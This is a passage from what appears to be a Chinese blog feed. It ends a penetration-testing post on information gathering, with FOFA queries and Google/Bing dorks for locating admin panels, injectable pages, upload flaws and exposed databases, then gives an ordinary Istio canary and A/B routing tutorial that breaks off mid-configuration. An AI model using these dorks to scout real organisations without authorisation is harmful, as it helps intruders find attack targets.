apl">https://gitee.com/kn1fes/JSFinder         jsfinder<br>https://github.com/rtcatc/Packer-Fuzzer     Packer-Fuzzer<br>https://gitee.com/mucn/SecretFinder         SecretFinder<br></code></pre></td></tr></table></figure></li></ul><h2 id="7、综合性信息收集"><a href="#7、综合性信息收集" class="headerlink" title="7、综合性信息收集"></a>7、综合性信息收集</h2><p> 这里的收集就相对来说收集的更全面，同时也是更多的都是采用网络，想要很好的进行信息收集，那么一定需要会 FQ，</p><h2 id="7-1搜索引擎"><a href="#7-1搜索引擎" class="headerlink" title="7.1搜索引擎"></a>7.1搜索引擎</h2><p> 学会他们的搜索语法</p><p> fofa</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apl">domain=&quot;qq.com&quot;            #查询子域名<br>host=&quot;.gov.cn&quot;            #从url中搜索&quot;.gov.cn&quot; <br>header=&quot;thinkphp&quot;           #从http头中搜索thinkphp <br>port=&quot;6379&quot;                #查找对应“6379”端口的资产<br>ip=&quot;1.1.1.1&quot;            #从ip中搜索包含“1.1.1.1”的网站<br>ip=&quot;220.181.111.1/24&quot;    #查询IP为“220.181.111.1”的C网段资产<br>status_code=&quot;402&quot;           #查询服务器状态为“402”的资产<br>app=&quot;通达OA网络智能办公系统&quot; #搜索通达OA系统<br>country=&quot;CN&quot;            #搜索指定国家(编码)的资产<br>region=&quot;Henan&quot;            #搜索指定行政区的资产<br>city=&quot;beijing&quot;              #搜索指定城市的资产<br></code></pre></td></tr></table></figure><p> 360Quake</p><p> 奇安信鹰图</p><p> google语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apl">特殊语法：<br>site：可以限制你搜索范围的域名；                                      <br>inurl：用于搜索网页上包含的URL，这个语法对寻找网页上的搜索，帮助之类的很有用； <br>intext: 只搜索网页&lt;body&gt;部分中包含的文字(也就是忽略了标题、URL等的文字)； <br>intitle:   查包含关键词的页面，一般用于社工别人的webshell密码； <br>filetype：搜索文件的后缀或者扩展名；<br>intitle：限制你搜索的网页标题； <br>inanchor: 搜素网站锚节点内容<br>cache# 缓存搜索 cache关键字<br>cache:secquan.org 当一个链接无法访问时（或信息被屏蔽时）；当信息已经被修改，想看以前的信息时<br>常用技巧：<br>查找后台地址：<br>site:域名<br>inurl:login|admin|manage|member|admin_login|login_admin|system|user|main|cms<br>查找文本内容：<br>site:域名 intext:管理|后台|登陆|用户名|密码|验证码|系统|admin|login|sys|managetem|password|username <br>查找可注入点：<br>site:域名 inurl:aspx|jsp|php|asp<br>查找上传漏洞：<br>site:域名 inurl:file|load|editor|Files<br>找eweb编辑器：<br>site:域名 inurl:ewebeditor|editor|uploadfile|eweb|edit<br>存在的数据库：<br>site:域名 filetype:mdb|asp|#<br>查看脚本类型(文件)<br>site:域名 filetype:asp/aspx/php/jsp<br>迂回策略入侵：<br>inurl:cms/data/templates/images/index/<br></code></pre></td></tr></table></figure><p> bing语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">inbody: 查找正文内容inbody:密码|登陆  查找标签内容<br>inanchor: 查找锚节点<br>filetype: 查找文件类型<br>site:返回属于指定网站的网页。若要搜索两个或更多域，请使用逻辑运算符OR对域进行分组ip:查找特点ip的网站<br></code></pre></td></tr></table></figure><h2 id="7-2网盘搜索"><a href="#7-2网盘搜索" class="headerlink" title="7.2网盘搜索"></a>7.2网盘搜索</h2><p> 直接百度网盘搜索，就可搜到很多在线网盘，然后进入网盘搜索关键词，如单位名、单位别称等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apl">https://wooyun.website/       乌云漏洞库 <br>https://www.lingfengyun.com/  凌云搜索   <br>http://www.pansoso.com        盘搜搜     <br>http://www.pansou.com/        盘搜       <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>istio实现灰度发布，A/B发布， Kiali网格可视化（二）</title>
    <link href="/2025/04/18/istio%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83%EF%BC%8CA-B%E5%8F%91%E5%B8%83%EF%BC%8C-Kiali%E7%BD%91%E6%A0%BC%E5%8F%AF%E8%A7%86%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2025/04/18/istio%E5%AE%9E%E7%8E%B0%E7%81%B0%E5%BA%A6%E5%8F%91%E5%B8%83%EF%BC%8CA-B%E5%8F%91%E5%B8%83%EF%BC%8C-Kiali%E7%BD%91%E6%A0%BC%E5%8F%AF%E8%A7%86%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>代码发布是软件开发生命周期中的一个重要环节，确保新功能和修复能够顺利上线。以下是几种常见的代码发布流程。在学习灰度发布之前。我们首先回忆下代码发布常用的几种方法。</p><p><strong>A&#x2F;B（蓝绿）发布</strong>：</p><p>蓝绿部署是一种通过维护两套独立的环境（蓝环境和绿环境）来实现零停机时间发版的方法。当前版本（蓝）和新版本（绿）是完全独立的，在绿色环境通过验证后，流量被切换到绿色环境。</p><p><strong>优点</strong>：对用户无感，是最安全的发布方式，业务稳定</p><p><strong>缺点</strong>：需要两套系统，对资源要求比较高，成本特别高</p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2f93f6514d494bf0bcbe58e03eec3ad5.png" alt="img" style="zoom:33%;" /><p><strong>滚动式发布</strong>：</p><p>按批次停止老版本实例，启动新版本实例。滚动更新是指逐步替换系统中的旧版本实例，而不是一次性替换所有实例。这样可以保证在更新过程中，始终有一部分实例在服务用户。</p><p><strong>优点</strong>：</p><ul><li>平滑过渡，减少停机时间。</li><li>节约资源，用户无感</li></ul><p><strong>缺点</strong>：</p><ul><li>在某些情况下，可能会有部分实例同时运行不同版本，导致潜在的不一致问题。部署和回滚的速度慢</li></ul><img src="https://gitee.com/ljh00928/csdn/raw/master/img/37ecd290bded4418b4bafdd48cdc3e7e.png" alt="img" style="zoom:33%;" /><p><strong>灰度（金丝雀）发布</strong>：</p><p>根据比例将老版本升级，例如80%用户访问是老版本，20%用户访问是新版本。金丝雀发布是将新版本应用于生产环境中的少数实例，逐步将流量引入新版本。随着监控的稳定，逐渐扩大新版本的流量范围，直到所有流量都转向新版本。</p><p><strong>优点</strong>：</p><ul><li>能在真实环境中测试新版本，减少风险。</li><li>可以通过监控和日志快速发现问题，并且迅速回滚。</li></ul><p><strong>缺点</strong>：</p><ul><li>发布周期较长，逐步切换流量可能影响性能。</li></ul><img src="https://gitee.com/ljh00928/csdn/raw/master/img/280b3e0a56c94e0f9da2290db88a6ff2.png" alt="img" style="zoom:33%;" /><p>在现代微服务架构中，应用的更新和发布是一个高频且关键的操作。如何在不影响用户体验的前提下，安全、平稳地将新版本应用推送到生产环境，是每个开发者和运维团队必须面对的挑战。灰度发布（Gray Release）作为一种渐进式发布策略，能够有效降低发布风险。</p><p>在 Kubernetes 中，灰度发布可以通过多种方式实现，例如：</p><ul><li><strong>Deployment + Service</strong>：修改副本数，手动控制流量切换。</li><li><strong>Ingress 注解</strong>：通过 Nginx Ingress Controller 的注解功能实现流量分割。</li><li><strong>Istio</strong>：通过服务网格实现高级流量管理。</li></ul><p>本文重点讲解在k8s中 基于Istio的灰度发布如何实现。</p><p><strong>上传镜像到harbor仓库</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@harbor</span>.cherry.com docker-client]<span class="hljs-meta"># docker login harbor.cherry.com</span><br>[root<span class="hljs-symbol">@worker232</span> ~]<span class="hljs-meta"># docker push harbor.cherry.com/istio/busybox:1.36.1</span><br></code></pre></td></tr></table></figure><h1 id="灰度发布"><a href="#灰度发布" class="headerlink" title="灰度发布"></a>灰度发布</h1><p><strong>流量管理之路由（权重路由模拟灰度发布）</strong></p><p>使用Deployment控制器部署两个版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# <span class="hljs-built_in">cat</span> 01-deploy-apps.yaml <br>apiVersion: v1<br>kind: Namespace<br>metadata:<br>  name: cherry<br><br>---<br><br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: apps-v1<br>  namespace: cherry<br>spec:<br>  replicas: 1<br>  selector:<br>    matchLabels:<br>      app: xiuxian01<br>      version: v1<br>      auther: cherry<br>  template:<br>    metadata:<br>      labels:<br>        app: xiuxian01<br>        version: v1<br>        auther: cherry<br>    spec:<br>      containers:<br>      - name: c1<br>        ports:<br>        - containerPort: 80<br>        image: harbor.cherry.com/istio/busybox:1.36.1<br>        <span class="hljs-built_in">command</span>: [<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo &#x27;c1&#x27; &gt; /var/www/index.html;httpd -f -p 80 -h /var/www&quot;</span>]<br>---<br><br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: apps-v2<br>  namespace: cherry<br>spec:<br>  replicas: 1<br>  selector:<br>    matchLabels:<br>      app: xiuxian02<br>      version: v2<br>      auther: cherry<br>  template:<br>    metadata:<br>      labels:<br>        app: xiuxian02<br>        version: v2<br>        auther: cherry<br>    spec:<br>      containers:<br>      - name: c2<br>        ports:<br>        - containerPort: 80<br>        image: harbor.cherry.com/istio/busybox:1.36.1<br>        <span class="hljs-built_in">command</span>: [<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;echo &#x27;c2&#x27; &gt; /var/www/index.html;httpd -f -p 80 -h /var/www&quot;</span>]<br><br></code></pre></td></tr></table></figure><p>手动注入Istio-proxy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">查看注入之前的标签<br>[root@master231 istio]# kubectl -n cherry get pod --show-labels <br>NAME                       READY   STATUS    RESTARTS   AGE     LABELS<br>apps-v1-67884c795b-256jd   1/1     Running   0          3m47s   app=xiuxian01,auther=cherry,pod-template-hash=67884c795b,version=v1<br>apps-v2-754f9b6f8-hx9s4    1/1     Running   0          3m47s   app=xiuxian02,auther=cherry,pod-template-hash=754f9b6f8,version=v2<br><br>将Istio sidecar代理注入注入指定名称空间下<br>[root@master231 istio]# istioctl kube-inject -f 01-deploy-apps.yaml | kubectl -n cherry  apply -f -<br>namespace/cherry unchanged<br>deployment.apps/apps-v1 configured<br>deployment.apps/apps-v2 configured<br><br>再次查看标签.注入istio之后。很明显pod数量也变成了两个。<br>[root@master231 istio]# kubectl -n cherry get pod --show-labels<br>NAME                       READY   STATUS    RESTARTS   AGE   LABELS<br>apps-v1-77f9877969-2c54w   2/2     Running   0          38s   app=xiuxian01,auther=cherry,pod-template-hash=77f9877969,security.istio.io/tlsMode=istio,service.istio.io/canonical-name=xiuxian01,service.istio.io/canonical-revision=v1,version=v1<br>apps-v2-64bcbb594b-jbdqd   2/2     Running   0          38s   app=xiuxian02,auther=cherry,pod-template-hash=64bcbb594b,security.istio.io/tlsMode=istio,service.istio.io/canonical-name=xiuxian02,service.istio.io/canonical-revision=v2,version=v2<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/c292cd30926d4b13a6ad781d92a35685.png" alt="在这里插入图片描述"></p><p>通过查看标签，部署的v1和v2他们version不同。但是auther是相同的。所以我们编写svc的时候。可以分别通过version关联不同版本的pod。使用auther同时关联两个pod</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# <span class="hljs-built_in">cat</span> 02-svc-apps.yaml <br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: apps-svc-v1<br>  namespace: cherry<br>spec:<br>  selector:<br>    <span class="hljs-comment">#关联v1版本</span><br>    version: v1<br>  ports:<br>  - protocol: TCP<br>    port: 80<br>    targetPort: 80<br>    name: http<br><br>---<br><br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: apps-svc-v2<br>  namespace: cherry<br>spec:<br>  selector:<br>    <span class="hljs-comment">#关联v2版本</span><br>    version: v2<br>  ports:<br>  - protocol: TCP<br>    port: 80<br>    targetPort: 80<br>    name: http<br><br>---<br><br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: apps-svc-all<br>  namespace: cherry<br>spec:<br>  selector:<br>    <span class="hljs-comment">#关联两个版本</span><br>    auther: cherry<br>  ports:<br>  - protocol: TCP<br>    port: 80<br>    targetPort: 80<br>    name: http<br></code></pre></td></tr></table></figure><p>查看svc详情详细,不难发现通过auther关联的pod。ep列表有两个ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# kubectl -n cherry describe svc<br>Name:              apps-svc-all<br>Namespace:         cherry<br>Labels:            &lt;none&gt;<br>Annotations:       &lt;none&gt;<br>Selector:          auther=cherry<br>Type:              ClusterIP<br>IP Family Policy:  SingleStack<br>IP Families:       IPv4<br>IP:                10.200.95.30<br>IPs:               10.200.95.30<br>Port:              http  80/TCP<br>TargetPort:        80/TCP<br>Endpoints:         10.100.1.18:80,10.100.2.17:80<br>Session Affinity:  None<br>Events:            &lt;none&gt;<br><br><br>Name:              apps-svc-v1<br>Namespace:         cherry<br>Labels:            &lt;none&gt;<br>Annotations:       &lt;none&gt;<br>Selector:          version=v1<br>Type:              ClusterIP<br>IP Family Policy:  SingleStack<br>IP Families:       IPv4<br>IP:                10.200.99.39<br>IPs:               10.200.99.39<br>Port:              http  80/TCP<br>TargetPort:        80/TCP<br>Endpoints:         10.100.1.18:80<br>Session Affinity:  None<br>Events:            &lt;none&gt;<br><br><br>Name:              apps-svc-v2<br>Namespace:         cherry<br>Labels:            &lt;none&gt;<br>Annotations:       &lt;none&gt;<br>Selector:          version=v2<br>Type:              ClusterIP<br>IP Family Policy:  SingleStack<br>IP Families:       IPv4<br>IP:                10.200.229.240<br>IPs:               10.200.229.240<br>Port:              http  80/TCP<br>TargetPort:        80/TCP<br>Endpoints:         10.100.2.17:80<br>Session Affinity:  None<br>Events:            &lt;none&gt;<br></code></pre></td></tr></table></figure><p>部署VirtualService。将来访问apps-svc-all-vs的时候。会代理apps-svc-v1和apps-svc-v2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# <span class="hljs-built_in">cat</span> 03-vs-apps-svc-all.yaml <br>apiVersion: networking.istio.io/v1beta1<br><span class="hljs-comment"># apiVersion: networking.istio.io/v1alpha3</span><br>kind: VirtualService<br>metadata:<br>  name: apps-svc-all-vs<br>  namespace: cherry<br>spec:<br>  <span class="hljs-comment"># 指定vs关联的后端svc名称</span><br>  hosts:<br>  - apps-svc-all<br>  <span class="hljs-comment"># 配置http配置</span><br>  http:<br>    <span class="hljs-comment"># 定义路由信息</span><br>  - route:<br>      <span class="hljs-comment"># 定义目标</span><br>    - destination:<br>        host: apps-svc-v1<br>      <span class="hljs-comment"># 指定权重</span><br>      weight: 90<br>    - destination:<br>        host: apps-svc-v2<br>      weight: 10<br></code></pre></td></tr></table></figure><p>部署客户端测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# <span class="hljs-built_in">cat</span> 04-deploy-client.yaml <br>apiVersion: apps/v1<br>kind: Deployment<br>metadata:<br>  name: apps-client<br>  namespace: cherry<br>spec:<br>  replicas: 1<br>  selector:<br>    matchLabels:<br>      app: client-test<br>  template:<br>    metadata:<br>      labels:<br>        app: client-test<br>    spec:<br>      containers:<br>      - name: c1<br>        image: registry.cn-hangzhou.aliyuncs.com/yinzhengjie-k8s/apps:v1 <br>        <span class="hljs-built_in">command</span>:<br>        - <span class="hljs-built_in">tail</span><br>        - -f<br>        - /etc/hosts<br></code></pre></td></tr></table></figure><p>客户端注入Istio-proxy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# istioctl kube-inject -f 04-deploy-client.yaml | kubectl -n cherry apply -f -<br>deployment.apps/apps-client configured<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# kubectl -n cherry get pod<br>NAME                          READY   STATUS    RESTARTS   AGE<br>apps-client-98fddd875-hp259   2/2     Running   0          3m24s<br>apps-v1-77f9877969-2c54w      2/2     Running   0          104m<br>apps-v2-64bcbb594b-jbdqd      2/2     Running   0          104m<br><br><br>[root@master231 istio]# kubectl <span class="hljs-built_in">exec</span> -it apps-client-98fddd875-hp259 -n cherry -- sh<br>/ <span class="hljs-comment"># while true; do curl http://apps-svc-all;sleep 0.1;done</span><br>c1<br>c1<br>c1<br>c1<br>c1<br>c2<br>c1<br>c1<br>c1<br>c1<br>c1<br>c2<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>/ <span class="hljs-comment"># while true; do curl http://apps-svc-all; sleep 0.1; done &gt; 1.txt</span><br>/ <span class="hljs-comment"># cat 1.txt | sort | uniq -c</span><br>     72 c1<br>     10 c2<br></code></pre></td></tr></table></figure><p>此时很明显。通过VirtualService资源定义svc权重比。已经达到了灰度发布的一个效果</p><h1 id="A-B测试"><a href="#A-B测试" class="headerlink" title="A&#x2F;B测试"></a>A&#x2F;B测试</h1><p>流量管理之基于用户匹配（定向路由模拟A&#x2F;B测试）</p><p>通过请求头信息。将版本精确打入到指定的区域。这里我们将header信息name是cherry的。全部打入v1版本。否则全部打入v2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# <span class="hljs-built_in">cat</span> 05-vs-apps-svc-all.yaml <br>apiVersion: networking.istio.io/v1beta1<br>kind: VirtualService<br>metadata:<br>  name: apps-svc-all-vs<br>  namespace: cherry<br>spec:<br>  hosts:<br>  - apps-svc-all<br>  http:<br>    <span class="hljs-comment"># 定义匹配规则</span><br>  - match:<br>      <span class="hljs-comment"># 基于header信息匹配将其进行路由，header信息自定义即可。</span><br>    - headers:<br>        <span class="hljs-comment"># 匹配用户名包含&quot;cherry&quot;的用户，这个KEY是咱们自定义的。</span><br>        username:<br>          <span class="hljs-comment"># &quot;eaxct&quot;关键词是包含，也可以使用&quot;prefix&quot;进行前缀匹配。</span><br>          exact: cherry<br>    route:<br>    - destination:<br>        host: apps-svc-v1<br>  - route:<br>    - destination:<br>        host: apps-svc-v2<br></code></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio]# kubectl <span class="hljs-built_in">exec</span> -it apps-client-98fddd875-hp259 -n cherry -- sh<br>/ <span class="hljs-comment">#  while true; do curl -H  &quot;username:cherry&quot; http://apps-svc-all;sleep 0.1;done  # 添加用户认证的header信息</span><br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>c1<br>^C<br>/ <span class="hljs-comment">#  while true; do curl  http://apps-svc-all;sleep 0.1;done # 不添加用户认证</span><br>c2<br>c2<br>c2<br>c2<br>c2<br>c2<br>c2<br></code></pre></td></tr></table></figure><h1 id="网格可视化"><a href="#网格可视化" class="headerlink" title="网格可视化"></a>网格可视化</h1><p> Kiali 是一个为 Istio 提供图形化界面和丰富观测功能的 Dashboard 的开源项目，其名称源于希腊语，意思是望远镜。用户利用 Kiali 可以监测网格内服务的实时工作状态，管理Istio的网络配置，快速识别网络问题。但是从Istio 1.7开始，默认不安装控制面板Kiali等组件，所以需要用户自行单独安装控制面板Kiali及相关的组件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio-1.17.3]#  kubectl apply -f samples/addons<br><br>[root@master231 istio-1.17.3]# kubectl apply -f samples/addons/extras<br></code></pre></td></tr></table></figure><p>配置Kiali控制面板对外访问</p><p>查看kiali服务，发现其类型为ClusterIP，没有对外暴露端口，无法从外部访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@chon istio-1.9.0]# kubectl get service kiali -n istio-system<br></code></pre></td></tr></table></figure><p>将类型改NodePort</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 istio-1.17.3]# kubectl -n istio-system edit svc kiali<br>...<br>spec:<br>  clusterIP: 10.200.5.137<br>  clusterIPs:<br>  - 10.200.5.137<br>  externalTrafficPolicy: Cluster<br>  internalTrafficPolicy: Cluster<br>  ipFamilies:<br>  - IPv4<br>  ipFamilyPolicy: SingleStack<br>  ports:<br>  - appProtocol: http<br>    name: http<br>    nodePort: 30003      <span class="hljs-comment">#添加对外暴露端口</span><br>    port: 20001<br>    protocol: TCP<br>    targetPort: 20001<br>  - appProtocol: http<br>    name: http-metrics<br>    nodePort: 